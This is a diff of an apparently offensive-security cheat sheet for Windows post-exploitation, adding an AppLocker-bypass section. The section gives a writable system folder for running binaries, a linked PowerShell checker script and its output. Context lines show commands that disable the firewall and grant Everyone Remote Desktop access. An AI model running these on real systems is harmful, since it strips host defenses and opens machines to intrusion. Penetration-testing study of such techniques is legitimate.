@@ -49,11 +49,19 @@ netsh advfirewall set allprofiles state off
 net localgroup "Remote Desktop Users" Everyone /Add
 ```
 
-## Bypass Windows Applocker
+# Bypass Windows Applocker
 
-- Safer location for executing binaries.
-
+- Location.
  `C:\Windows\System32\spool\drivers\color`
+ - [applocker-bypas-checker.ps1](https://github.com/sparcflow/GibsonBird/blob/master/chapter4/applocker-bypas-checker.ps1) is a powershell script that returns folders for bypass applocker.
+```powershell
+  .\applocker.ps1
+[*] Processing folders recursively in C:\windows
+[+]  C:\windows\Tasks
+[+]  C:\windows\tracing
+[+]  C:\windows\System32\spool\drivers\color
+[+]  C:\windows\tracing\ProcessMonitor
+```
 
 # Powershell command history
 
